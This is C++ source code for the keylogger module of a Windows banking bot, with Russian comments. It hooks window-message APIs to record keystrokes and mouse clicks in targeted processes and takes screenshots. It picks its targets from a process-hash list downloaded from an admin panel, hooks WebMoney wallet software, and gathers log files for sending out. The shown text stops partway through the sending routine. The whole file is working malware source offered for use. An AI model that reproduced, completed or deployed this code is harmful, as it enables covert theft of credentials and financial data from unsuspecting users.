#include <windows.h>
#include <windowsx.h>

#include "GetApi.h"
#include "Utils.h"

#include "Memory.h"
#include "Strings.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Crypt.h"
#include "Unhook.h"
#include "Splice.h"


#include "Crypt.h"

#include "BotConfig.h"
#include "Loader.h"
#include "KeyLogger.h"
#include "Screens.h"
#include "md5.h"
#include "Config.h"
//#include "BotDebug.h"
// просто парсим баланс кошельков
#include "web_money_dll.h"


template <class STR>
void KeyLoger_Template(STR Str)
{
	#ifdef DebugUtils
		Debug::MessageEx("KeyLoger", 0, NULL, NULL, (PCHAR)Str);
	#endif
}


#define KLDBG KeyLoger_Template<>


// Все функции которые мы будем хучить для KeyLogger
typedef BOOL ( WINAPI *PPeekMessage )( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                                       UINT wMsgFilterMax, UINT wRemoveMsg );

typedef BOOL ( WINAPI *PGetMessage )( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                                      UINT wMsgFilterMax);

typedef BOOL (WINAPI* PCloseWindow)(HWND hWnd);

// Перехватываем как ANSI, так и UNICODE
static PCloseWindow Real_CloseWindow; 

static PGetMessage	Real_GetMessageA;
static PPeekMessage	Real_PeekMessageA;

static PGetMessage	Real_GetMessageW;
static PPeekMessage	Real_PeekMessageW;

static void ProcessCharMessageA(LPMSG lpMsg, HWND hWnd);
static void ProcessCharMessageW(LPMSG lpMsg, HWND hWnd);

static void ProcessMouseMessageA(LPMSG lpMsg, HWND hWnd);
static void ProcessMouseMessageW(LPMSG lpMsg, HWND hWnd);

static void DumpKeyLogBufA();
static void DumpKeyLogBufW();

// Можно эти буфера выделить динамически при инициализации Кейлогера
// и очистить при выключении приложения, но тогда надо писать ф-и init/shutdown_keyloger
static CHAR  g_szKeyLogBufA[0x400] = {'\0'};
static WCHAR g_szKeyLogBufW[0x400] = {L'\0'};
static WCHAR SysPath1[0x400];//путь к запущенному ехе

static LONG g_Timer = 0;

static HWND g_KeyLoghWnd = 0;
static LONG g_KeyLogbPosA = 0;
static LONG g_KeyLogbPosW = 0;


char DownloadHach[15];
WCHAR sHach[15];
WCHAR wcharHachFile[15];
WCHAR ScrName[MAX_PATH];
DWORD screen_md5;


bool WriteToCurFile(WCHAR * FileName,char * WriteData )
{
	pOutputDebugStringW(FileName);
	pOutputDebugStringW(SysPath1);

	bool ex=false;
	if ( (DWORD)pGetFileAttributesW( FileName ) == -1 ) ex=true;
	HANDLE hFile = (HANDLE)pCreateFileW( SysPath1, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
	if (hFile!=INVALID_HANDLE_VALUE)
	{
		if (ex)
		{

			DWORD dwBytesRead;
			PCHAR HashStr = WSTR::ToAnsi(&sHach[0], 0);
			PCHAR HachFileStr = WSTR::ToAnsi(wcharHachFile, 0);
			PCHAR ScrNameStr = WSTR::ToAnsi(ScrName, 0);
			PCHAR WriteD = STR::New(8, ScrNameStr,"\r\n",DownloadHach,"\r\n", HashStr,"\r\n", HachFileStr,"\r\n");
			STR::Free(ScrNameStr);
			STR::Free(HashStr);
			STR::Free(HachFileStr);
			WriteFile(hFile,WriteD,m_lstrlen(WriteD),&dwBytesRead,NULL);
			STR::Free(WriteD);
		}
		DWORD dwSiseFile=0;
		DWORD dwBytesRead=0;
		pSetFilePointer(hFile, 0, NULL, FILE_END);
		pWriteFile(hFile,WriteData,m_lstrlen(WriteData),&dwBytesRead,NULL);
		pWriteFile(hFile,"\r\n",2,&dwBytesRead,NULL);
		pCloseHandle(hFile);
		return true;
	}

	return false;
}



void scrShot()
{
	typedef int ( WINAPI *fwsprintfW )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
		fwsprintfW pwsprintfW = (fwsprintfW)GetProcAddressEx( NULL, 3, 0xEA3AF0C1 );
	//клепаем скрин
	screen_md5=SetScreensThread(&ScrName[0]);
	// хеш самого файла картинки который будем передавать
	m_memset(wcharHachFile,0,15*sizeof(WCHAR));
	pwsprintfW((LPTSTR)wcharHachFile, (LPCTSTR)L"0x%u", screen_md5);

}

/************************************************************************/
void DumpKeyLogBufA()
{
	if (0 != g_KeyLogbPosA)
	{
		// Ставим конец строки в буфере
		g_szKeyLogBufA[g_KeyLogbPosA] = '\0';

		char *OutBuf = (char *)MemAlloc(1024);
		char *ClsBuf = (char *)MemAlloc(MAX_PATH);
		if (OutBuf && ClsBuf)
		{
			pGetClassNameA(g_KeyLoghWnd, ClsBuf, MAX_PATH - 1);
			RECT hRect;
			pGetWindowRect(g_KeyLoghWnd,&hRect);

			if ( (DWORD)pGetFileAttributesW( &ScrName[0] ) == -1 )
			{

			}

			
			wsprintfA(OutBuf, "[%d,%d,%d,%d]hWnd: %x: WndClass: %s Symbols: %s",hRect.left,hRect.top,hRect.right,hRect.left, g_KeyLoghWnd, ClsBuf, g_szKeyLogBufA);
			WriteToCurFile(SysPath1,OutBuf);

			pOutputDebugStringA(OutBuf);

			WriteToCurFile(&SysPath1[0], OutBuf);

			MemFree(ClsBuf);
			MemFree(OutBuf);
		}

		g_KeyLogbPosA = 0;
	}
}

/************************************************************************/
void DumpKeyLogBufW()
{
	if (0 != g_KeyLogbPosW)
	{
		// Ставим конец строки в буфере
		g_szKeyLogBufW[g_KeyLogbPosW] = L'\0';

		WCHAR *OutBuf = (WCHAR *)MemAlloc(1024);
		WCHAR *ClsBuf = (WCHAR *)MemAlloc(MAX_PATH);
		if (OutBuf && ClsBuf)
		{
			pGetClassNameW(g_KeyLoghWnd, ClsBuf, MAX_PATH - 1);
			RECT hRect;
			pGetWindowRect(g_KeyLoghWnd,&hRect);
			
			POINT p1,p2;
			p1.x=hRect.left;
			p1.y=hRect.top;
			p2.x=hRect.right;
			p2.y=hRect.bottom;
			ScreenToClient(g_KeyLoghWnd,&p1);
			ScreenToClient(g_KeyLoghWnd,&p2);
			
			wsprintfW(OutBuf, L"[%d,%d,%d,%d]hWnd: %x: WndClass: %s Symbols: %s",p1.x,p1.y,p2.x,p2.y, g_KeyLoghWnd, ClsBuf, g_szKeyLogBufW);
			PCHAR OutBufStr = WSTR::ToAnsi(OutBuf, 0);
			WriteToCurFile(SysPath1,OutBufStr);

			STR::Free(OutBufStr);

			MemFree(ClsBuf);
			MemFree(OutBuf);
		}

		g_KeyLogbPosW = 0;
	}
}

/************************************************************************/
void ProcessCharMessageA(LPMSG lpMsg, HWND hWnd)
{
	// Если в самый первый раз сюда попали
	if (0 == g_KeyLoghWnd) 
	{
		// Запоминаем хэндл окна
		g_KeyLoghWnd = lpMsg->hwnd;
	}
	
	// Если перехватили нажатие клавиши в том же самом окне, то добавляем
	// символ в буфер
	if (g_KeyLoghWnd == lpMsg->hwnd)
	{
		// Символ печатный?
		if (lpMsg->wParam >= 32)
			g_szKeyLogBufA[g_KeyLogbPosA++] = (char)lpMsg->wParam;
		else
		// Обрабатываем спецклавиши
		{
			static char szWord[20] = {'\0'};
			switch (lpMsg->wParam)
			{
				case VK_RETURN:
					{

						plstrcpyA(szWord, "{Enter}");
						char *ptr = &g_szKeyLogBufA[g_KeyLogbPosA];
						plstrcpyA(ptr, szWord);
						g_KeyLogbPosA += lstrlen(szWord);
						break;
					}
				case VK_BACK:
					{
						plstrcpyA(szWord, "{BackSpace}"); 
						char *ptr = &g_szKeyLogBufA[g_KeyLogbPosA];
						plstrcpyA(ptr, szWord);
						g_KeyLogbPosA += lstrlen(szWord);
						break;
					}
				default:
					{
						wsprintfA(szWord, "{#%0x}", lpMsg->wParam);
						char *ptr = &g_szKeyLogBufA[g_KeyLogbPosA];
						plstrcpyA(ptr, szWord);
						g_KeyLogbPosA += lstrlen(szWord);
					}
			}// case
		}
	}
	else
	// Если это уже другое окно, то дампим буфер и начинаем заполнять его
	// с самого начала
	{
		DumpKeyLogBufA();

		// Запоминаем хэндл окна
		g_KeyLoghWnd = lpMsg->hwnd;

		g_szKeyLogBufA[g_KeyLogbPosA++] = (char)lpMsg->wParam;
	}
}

/************************************************************************/
bool fleg=true; 
void ProcessCharMessageW(LPMSG lpMsg, HWND hWnd)
{
	// Если в самый первый раз сюда попали
	if (0 == g_KeyLoghWnd) 
		g_KeyLoghWnd = lpMsg->hwnd;

	// Если перехватили нажатие клавиши в том же самом окне, то добавляем
	// символ в буфер
	if (g_KeyLoghWnd == lpMsg->hwnd)
	{
		// Символ печатный?
		if (lpMsg->wParam >= 32)
		{
			//if (fleg)
			g_szKeyLogBufW[g_KeyLogbPosW++] = lpMsg->wParam;
			//pOutputDebugStringW(g_szKeyLogBufW);
		}
		else
		// Обрабатываем спецклавиши
		{
			static WCHAR szWord[20] = {L'\0'};
			switch (lpMsg->wParam)
			{
				case VK_RETURN:
					{
						lstrcpyW(szWord, L"{Enter}");
						WCHAR *ptr = &g_szKeyLogBufW[g_KeyLogbPosW];
						lstrcpyW(ptr, szWord);
						g_KeyLogbPosW += lstrlenW(szWord);
						break;
					}
				case VK_BACK:
					{
						lstrcpyW(szWord, L"{BackSpace}"); 
						WCHAR *ptr = &g_szKeyLogBufW[g_KeyLogbPosW];
						lstrcpyW(ptr, szWord);
						g_KeyLogbPosW += lstrlenW(szWord);
						break;
					}
				default:
					{
						wsprintfW(szWord, L"{#%0x}", lpMsg->wParam);
						WCHAR *ptr = &g_szKeyLogBufW[g_KeyLogbPosW];
						lstrcpyW(ptr, szWord);
						g_KeyLogbPosW += lstrlenW(szWord);
						
					}
			}// case		
		}
	}
	else
	// Если это уже другое окно, то дампим буфер и начинаем заполнять его
	// с самого начала
	{
		DumpKeyLogBufW();
		g_KeyLoghWnd = lpMsg->hwnd;
		g_szKeyLogBufW[g_KeyLogbPosW++] = lpMsg->wParam;
	}
}

/************************************************************************/
void ProcessMouseMessageA(LPMSG lpMsg, HWND hWnd)
{
	static char szMouseBtn[20] = {'\0'};
	static char szBuf[50] = {'\0'};
	
	if ((lpMsg->wParam & MK_LBUTTON) == MK_LBUTTON)
		lstrcpy(szMouseBtn, "{Click}"); else
	if ((lpMsg->wParam & MK_RBUTTON) == MK_RBUTTON)
		lstrcpy(szMouseBtn, "{RClick}");

	if ( (DWORD)pGetFileAttributesW( &ScrName[0] ) == -1 )
	{
		scrShot();
	}

	wsprintfA(szBuf, "%s (x=%d;y=%d)", szMouseBtn,
						GET_X_LPARAM(lpMsg->lParam), GET_Y_LPARAM(lpMsg->lParam));
	KLDBG(szBuf);
	//pOutputDebugStringA(szBuf);
	WriteToCurFile(SysPath1,szBuf);
}

/************************************************************************/
void ProcessMouseMessageW(LPMSG lpMsg, HWND hWnd)
{
	static WCHAR szMouseBtn[20] = {L'\0'};
	static WCHAR szBuf[50] = {L'\0'};
	
	if ((lpMsg->wParam & MK_LBUTTON) == MK_LBUTTON)
		lstrcpyW(szMouseBtn, L"{Click}"); else
	if ((lpMsg->wParam & MK_RBUTTON) == MK_RBUTTON)
		lstrcpyW(szMouseBtn, L"{RClick}");

	if ( (DWORD)pGetFileAttributesW( &ScrName[0] ) == -1 )
	{
		scrShot();
	}

	wsprintfW(szBuf, L"%s (x=%d;y=%d)", szMouseBtn,
						GET_X_LPARAM(lpMsg->lParam), GET_Y_LPARAM(lpMsg->lParam));
	//OutputDebugStringW(szBuf);
	PCHAR BufStr = WSTR::ToAnsi(szBuf, 0);
	KLDBG(BufStr);
	WriteToCurFile(SysPath1, BufStr);
	STR::Free(BufStr);
}


BOOL WINAPI Hook_CloseWindow(HWND hWnd)
{

	return Real_CloseWindow(hWnd);
}
/************************************************************************/

BOOL WINAPI Hook_PeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                              UINT wMsgFilterMax, UINT wRemoveMsg)
{
	if (PM_REMOVE & wRemoveMsg)
	{
		switch (lpMsg->message)
		{
			case WM_SYSCOMMAND:
			{
				// ALT+F4
				if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
				{
					DumpKeyLogBufA();
				}
				break;
			}
			case WM_COPY:
			case WM_PASTE:
			{

			}
			case WM_CHAR:
			{				
				ProcessCharMessageA(lpMsg, hWnd);
				break;
			}
			case WM_LBUTTONDOWN:
			case WM_RBUTTONDOWN:
			{
				// Если левая кнопка, то дампим буфер
				if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
				{
					DumpKeyLogBufA();
				}
				// Для мышиного сообщения надо вначале вызывать стандартный обработчик, иначе
				// поля сообщения окажутся не заполенены
				BOOL res = Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
				ProcessMouseMessageA(lpMsg, hWnd);
				return res;
			}
		}
	}
	return Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
}

/************************************************************************/
BOOL WINAPI Hook_PeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                              UINT wMsgFilterMax, UINT wRemoveMsg)
{															
	if (PM_REMOVE & wRemoveMsg)
	{
		switch (lpMsg->message)
		{
			case WM_SYSCOMMAND:
			{
				// ALT+F4
				if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
				{
					DumpKeyLogBufW();
				}
				break;
			}
			case WM_CHAR:
			{	
				ProcessCharMessageW(lpMsg, hWnd);
				break;
			}
			case WM_LBUTTONDOWN:
			case WM_RBUTTONDOWN:
			{
				// Если левая кнопка, то дампим буфер
				if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
				{
					DumpKeyLogBufW();
				}
				// Для мышиного сообщения надо вначале вызывать стандартный обработчик, иначе
				// поля сообщения окажутся не заполенены
				BOOL res = Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
				ProcessMouseMessageW(lpMsg, hWnd);
				return res;
			}
		}
	}
	return Real_PeekMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
}

/************************************************************************/
DWORD dwTime=0;
BOOL WINAPI Hook_GetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                             UINT wMsgFilterMax)
{
	switch (lpMsg->message)
	{
		case WM_SYSCOMMAND:
		{
			// ALT+F4
			if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
			{
				DumpKeyLogBufW();
			}
			break;
		}
		case WM_CHAR:
		{
			char DataS[30];
			typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
			fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
			_pwsprintfA( &DataS[0], "%u,%u,%u,%u", lpMsg->lParam,lpMsg->wParam,lpMsg->time,lpMsg->pt.x );
			KLDBG(DataS);
			//pOutputDebugStringA(DataS);
			
		//	if (dwTime+5 >=lpMsg->time)
				ProcessCharMessageW(lpMsg, hWnd);

			dwTime=lpMsg->time;
			
			break;
		}
		case WM_LBUTTONDOWN:
		case WM_RBUTTONDOWN:
		{
			// Если левая кнопка, то дампим буфер
			if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
			{
				DumpKeyLogBufW();
			}
			// В отличии от PeekMessage здесь уже все
			// поля сообщения заполнены, поэтому вызываем наш обработчик
			ProcessMouseMessageW(lpMsg, hWnd);
		}
	}
	return Real_GetMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}


/************************************************************************/
BOOL WINAPI Hook_GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                             UINT wMsgFilterMax)
{
	switch (lpMsg->message)
	{
		case WM_SYSCOMMAND:
		{
			// ALT+F4
			if ((lpMsg->wParam & 0xFFF0) == SC_CLOSE)
			{
				DumpKeyLogBufA();
			}
			break;
		}
		case WM_CHAR:
		{
			ProcessCharMessageA(lpMsg, hWnd);
			break;
		}
		case WM_LBUTTONDOWN:
		case WM_RBUTTONDOWN:
		{
			// Если левая кнопка, то дампим буфер
			if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
			{
				DumpKeyLogBufA();
			}
			// В отличии от PeekMessage здесь уже все
			// поля сообщения заполнены, поэтому вызываем наш обработчик
			ProcessMouseMessageA(lpMsg, hWnd);
		}
	}
	return Real_GetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}

DWORD StrHachToDWORD(char*HachStr)
{// приобразовуем число в хеш
	int i=m_lstrlen(HachStr)-1;
	DWORD count=0;
	int rang=1;
	while(HachStr[i]!='x')
	{
		if(HachStr[i]=='1')
			count +=1*rang;
		else
		if(HachStr[i]=='2')
			count +=2*rang;
		else
		if(HachStr[i]=='3')
			count +=3*rang;
		else
		if(HachStr[i]=='4')
			count +=4*rang;
		else
		if(HachStr[i]=='5')
			count +=5*rang;
		else
		if(HachStr[i]=='6')
			count +=6*rang;
		else
		if(HachStr[i]=='7')
			count +=7*rang;
		else
		if(HachStr[i]=='8')
			count +=8*rang;
		else
		if(HachStr[i]=='9')
			count +=9*rang;
		else
		if(HachStr[i]=='A'||HachStr[i]=='a')
			count +=10*rang;
		else
		if(HachStr[i]=='B'||HachStr[i]=='B')
			count +=11*rang;
		else
		if(HachStr[i]=='C'||HachStr[i]=='c')
			count +=12*rang;
		else
		if(HachStr[i]=='D'||HachStr[i]=='d')
			count +=13*rang;
		else
		if(HachStr[i]=='E'||HachStr[i]=='e')
			count +=14*rang;
		else
		if(HachStr[i]=='F'||HachStr[i]=='f')
			count +=15*rang;
		else
		if(HachStr[i]=='0')
		{}
		else
			return 0;
		if (rang==1) 
			rang=16;
		else
			rang=rang*16;
		i--;
	}
	return count;
}
/************************************************************************/
bool HachExistIn(WCHAR *Dat)
{
//выходим, выдав месагу о чемто написаном в файле скачаном с сервака Application Data\Hpr\хеш
	WCHAR SysPath_[MAX_PATH];//получаем путь к заданной дериктории
	m_memset(SysPath_,0,MAX_PATH*2);
	SysPath_[0]='\0';
	plstrcpyW( SysPath_, L"\\Hpr\\" );
	plstrcatW( SysPath_, Dat);
	if(isFileExists(0x001a, SysPath_))
	{		
		char* DataToR=(char*)MemAlloc(1024);		
		DWORD dwReadDD;
		WCHAR SysPath[MAX_PATH];
		pSHGetFolderPathW(NULL, 0x001a, NULL, 0, SysPath);
		plstrcatW( SysPath,SysPath_);		
		HANDLE hHandle	=	pCreateFileW(SysPath, GENERIC_READ, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
		pReadFile(hHandle,DataToR,1024,&dwReadDD,NULL);
		pCloseHandle(hHandle);

		pMessageBoxA(0,DataToR,"Информация",MB_ICONINFORMATION);
		MemFree(DataToR);
		return true;
	}
	return false;
}
/************************************************************************/
bool ExistInHashSTR( char* strOfHash,DWORD ProcesHach)// есть ли в строке нужный хеш
{
	char *cUrlNext;
	int i;
	while (true)
	{// проверяем есть ли в списке наш процесс
		strOfHash= m_strstr(&strOfHash[0],"0x");
		if (strOfHash==NULL)break;
		cUrlNext= m_strstr(strOfHash,"|");
		i=m_lstrlen(strOfHash)-m_lstrlen(cUrlNext);
		m_memset(DownloadHach,0,10);			
		m_lstrncpy(DownloadHach,strOfHash,i);
		DownloadHach[i]='\0';
		if (StrHachToDWORD(DownloadHach)==ProcesHach)
		{
			return true;
			fleg=true;
			break;
		}		
		strOfHash= m_strstr(&strOfHash[1],"0x");
	}
	return false;
}

bool WINAPI IsKeyLoggerProcess()
{
	// Функция вернёт истину если она вызвана в процессе хеши которых храняться в файле C:\Documents and Settings\Nicolay_\Application Data\KYL\fi.dat
	// они грузяться с админки

	
	
	PWCHAR ModulePath = WSTR::Alloc(MAX_PATH);//(WCHAR*)MemAlloc( MAX_PATH*sizeof (WCHAR) );
	if ( ModulePath == NULL )return false;
	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );



	DWORD dwBytesRead;
	char DataPath[1024];
	
	PWCHAR path	=WSTR::Alloc(MAX_PATH);//= (WCHAR*)MemAlloc( MAX_PATH *sizeof (WCHAR));
	if ( path == NULL )return false;
	m_memset(path,0,MAX_PATH *sizeof (WCHAR));
	m_memset(DataPath,0,1024);

	WCHAR szFileFolderBuf[]= {'\\','K','Y','L',L'\0'};//
	WCHAR szFileBuf[]= {'\\','f','i','.','d','a','t',L'\0'};//
	pSHGetFolderPathW(NULL, 0x001a, NULL, 0, SysPath1);
	plstrcatW( SysPath1, szFileFolderBuf );
	plstrcpyW( path, SysPath1 );
			
	
	plstrcatW( path, szFileBuf );//по пиду и добавить папку

	//	Коля
//	Здесь список хешей процессов берётся из файла
	HANDLE hFile = (HANDLE)pCreateFileW( path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	if (hFile==INVALID_HANDLE_VALUE)
	{
		WSTR::Free(path);
		//MemFree( path );
		WSTR::Free(ModulePath);
		//MemFree( ModulePath );/**/
		return false;	
	}
	pReadFile(hFile,&DataPath[0],1024,&dwBytesRead,NULL);		
	pCloseHandle(hFile);

	bool fleg=false;
	//int i;
	//char *cUrl=&DataPath[0],*cUrlNext;

	fleg=ExistInHashSTR(DataPath,dwProcessHash);
	/*while (true)
	{// проверяем есть ли в списке наш процесс
		cUrl= m_strstr(&cUrl[0],"0x");
		if (cUrl==NULL)break;
		cUrlNext= m_strstr(cUrl,"|");
		i=m_lstrlen(cUrl)-m_lstrlen(cUrlNext);
		m_memset(DownloadHach,0,10);			
		m_lstrncpy(DownloadHach,cUrl,i);
		DownloadHach[i]='\0';
		if (StrHachToDWORD(DownloadHach)==dwProcessHash)
		{
			fleg=true;
			break;
		}		
		cUrl= m_strstr(&cUrl[1],"0x");
	}*/
	
	typedef int ( WINAPI *fwsprintfW )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfW pwsprintfW = (fwsprintfW)GetProcAddressEx( NULL, 3, 0xEA3AF0C1 );
	WCHAR szBuf1[25];

	pwsprintfW((LPTSTR)szBuf1, (LPCTSTR)L"0x%X", dwProcessHash);		
	if (HachExistIn(szBuf1))
	{
		//выходим, выдав месагу о чемто написаном в файле скачаном с сервака Application Data\Hpr\хеш
		ExitProcess(1);
	}
	if (fleg )//наконецто чтото нашли, начнем...
	{
		KLDBG("найден нужный поток");
	
		
		DWORD hachFileName =GetUniquePID();
		WCHAR szBuf[25];
		m_memset(szBuf,0,25*sizeof(WCHAR));

		//формируем имя файла лога
		plstrcpyW(ScrName, SysPath1);
		pwsprintfW((LPTSTR)szBuf, (LPCTSTR)L"\\hash%u.dats", hachFileName);
		plstrcatW(SysPath1, szBuf );

		
		
		//формируем имя джепега
		WCHAR szBuf1[25];
		m_memset(szBuf1,0,25*sizeof(WCHAR));
		pwsprintfW((LPTSTR)szBuf1, (LPCTSTR)L"\\scr%u.jpg", hachFileName);		
		plstrcatW( ScrName, szBuf1 );
		
		//инициализируем скриншоты
		InitScreenLib();
		scrShot();

		
		
		//хеш запуска файла, он считаеться из имени лог файла
		m_memset(sHach,0,15*sizeof(WCHAR));
		pwsprintfW((LPTSTR)sHach, (LPCTSTR)L"0x%u", CalcHashW( szBuf ));
	
		// Записываем полное имя процесса в файл лога
		PCHAR NameOfModulExe= WSTR::ToAnsi(ModulePath,0);
		WriteToCurFile(SysPath1,NameOfModulExe);
		STR::Free(NameOfModulExe);
		
		WSTR::Free(path);
		//MemFree( path );
		WSTR::Free(ModulePath);
		//MemFree( ModulePath );
		return true;
	}

	WSTR::Free(path);
	//MemFree( path );
	WSTR::Free(ModulePath);
	//MemFree( ModulePath );/**/
	return false;
}

/************************************************************************/
bool HookKeyLoggerApi_()
{
	
//генерируем уникальный номер запуска процесса и создаём файл
//из каждого хука пишем лог в файл 
//каждый на новой строке
//аналогично как  идёт вызов ф-ии ouputdebugstring(так в новую строку и фигачим)

	if ( HookApi( 3, 0xD7A87C2C, (DWORD)&Hook_PeekMessageA ) )
	{  
		__asm mov [Real_PeekMessageA], eax			
	}	

	if ( HookApi( 3, 0xC8A274AC, (DWORD)&Hook_GetMessageA ) )
	{  
		__asm mov [Real_GetMessageA], eax			
	}	

	if ( HookApi( 3, 0xD7A87C3A, (DWORD)&Hook_PeekMessageW ) )
	{  
		__asm mov [Real_PeekMessageW], eax			
	}	

	if ( HookApi( 3, 0xC8A274BA, (DWORD)&Hook_GetMessageW ) )
	{  
		__asm mov [Real_GetMessageW], eax			
	}

	/*if ( HookApi( 3, 0xF23EB1BF, (DWORD)&Hook_CloseWindow ) )
	{  
		__asm mov [Real_CloseWindow], eax			
	}*/
	//DbgMsg("HookKeylogerApi",0,"AFTER");
	KLDBG("поставили все хуки");
	return true;
}


/************************************************************************/
bool HookKeyLogger()
{
	// функция вешает хуки на базовые функции которые использует
	// KeyLogger для работы с сообщениями окон
	//
	

	if ( !IsKeyLoggerProcess() )
	{
		return false;
	}
	KLDBG("Устанавливаем кейлогер для текушего процесса");
	UnhookKeyLogger();
	//стартуем поток парсера кошельков
	#ifdef ___WEB_MONEY_DLLL____
		if (IsWebMoney())
			HookWebMoney();
	#endif
	HookKeyLoggerApi_();

	return true;
}


DWORD GetByteFileHash( LPBYTE FileContent, DWORD dwFileSize )
{	
	//возвращаем хеш мд5 полученного массива байт

	LPBYTE pbyFile  = FileContent;

	char Hash[33];
	m_memset( Hash, 0, 33 );

	if ( pbyFile != NULL )
	{
		MD5_CTX ctx;	

		MD5Init(&ctx);
		MD5Update( &ctx, (unsigned char*)pbyFile, dwFileSize );

		unsigned char buff[16];	

		MD5Final( buff, &ctx );

		typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
		fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

		int p = 0;

		for( int i = 0; i < 16; i++ )
		{
			_pwsprintfA( &Hash[p], "%02X", buff[i] );
			p += 2;
		}	
		
		Hash[32] = '\0';	
	}

	if ( !m_lstrlen( Hash ) )
	{
		return -1;
	}

	return CalcHash( Hash );
}

	#define _SECOND ( (ULONGLONG)10000000)
	#define _MINUTE (60 * _SECOND)
	#define _HOUR   (60 * _MINUTE)
	#define _DAY    (24 * _HOUR)
bool Time_Correct(FILETIME CreationTime)//больше 5 но меньще 20
{ 
	KLDBG("сравним ка время создания");
	FILETIME NowTim;
	LARGE_INTEGER tmp1,tmp2;
	tmp1.LowPart = CreationTime.dwLowDateTime;
	tmp1.HighPart = CreationTime.dwHighDateTime;

	
	SYSTEMTIME t;// структура времени
	pGetSystemTime(&t);// получить текущие время
	pSystemTimeToFileTime(	&t,			// указатель на структуру SYSTEMTIME 
							&NowTim);	// указатель на структуру FILETIME 

	 tmp2.LowPart = NowTim.dwLowDateTime;
	 tmp2.HighPart = NowTim.dwHighDateTime;

	
	 if ( ( (tmp1.QuadPart + 5*_MINUTE) < (ULONGLONG)tmp2.QuadPart ) )
	 {
			if ( ( (tmp1.QuadPart + 20*_MINUTE) > (ULONGLONG)tmp2.QuadPart ) )
			{
				return true;
			};
	 };
	 
	return false;
}

LPBYTE SendKeyLogerData(int FlagFolderDest,WCHAR *Path, WCHAR *Ext)
{
	
	WCHAR SysPath[MAX_PATH];//получаем путь к заданной дириктории
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, 0, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	if (SysPath[(int)plstrlenW(SysPath)-1]!='\\')
		plstrcatW( SysPath, L"\\" );
	// Функция отправляет файлы с расширением *.dats из переданной в параметре директории
	
	if (Path == NULL || Ext == NULL)
		return NULL;
	
	// ищет файлы в папке, в подпапки не лезет
	// собираем маску для поиска путь до папки кейлог данных + *.dats
	WCHAR Mask[MAX_PATH];
	plstrcpyW(Mask,SysPath);
	plstrcatW(Mask,Ext);


	//производим поиск по маске
	WIN32_FIND_DATAW Search;
	HANDLE File = pFindFirstFileW(Mask, &Search);
	if (File == INVALID_HANDLE_VALUE)
	{
		if (g_Timer>2 && g_Timer<5)
		{

			WriteToCurFile(SysPath1,"No find file");		
		}
		g_Timer++;
		return NULL;
	}
	//LPBYTE hResult=NULL;
	DWORD dwGlobSiz=0;
	// Перебираем найденные файлы
	while (File != NULL)
	{
		if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) //если файл найден
		{
			// собираем полный путь к найденному файлу
			WCHAR FileName[MAX_PATH];
			m_memset(FileName,0,MAX_PATH);
			plstrcpyW(FileName,SysPath);
			plstrcatW(FileName,Search.cFileName);

			//PCHAR FileName = STR::New(2, Path, Search.cFileName);
			//  В случае если файл имеет атрибут "Только чтение" меняем
			//  ему атрибуты
			if (Search.nFileSizeLow!=0)
			if ((Search.dwFileAttributes & FILE_ATTRIBUTE_READONLY) != 0)
				pSetFileAttributesW(FileName, FILE_ATTRIBUTE_ARCHIVE);
			{
				/*DbgMsg("",(int)Search.ftCreationTime.dwHighDateTime,"");	
				DbgMsg("",(int)Search.ftCreationTime.dwLowDateTime,"");	*/
//если файл создан меньше чем 5 минут назад,то идём к следующему файлу по циклу
//и если файл создан больше чем 20 минут назад,то идём к следующему файлу по циклу
								
				if (Time_Correct(Search.ftCreationTime))
				{
					DWORD dwWriteB=0;
				    LPBYTE Data=GetFileData(FileName,&dwWriteB);//читаем файл
					if (dwWriteB>0)
					if (Data!=NULL)
					{
						
						KLDBG("Начнем отправку с генератции всех необходимых данных");
						//имя джепега
						char* lpData1=(char*)Data;			
						char* lpData=m_strstr((char*)lpData1,"\r\n");					
						KLDBG("KeyLogger.h");
						DWORD ttt=(lpData-(char*)lpData1);
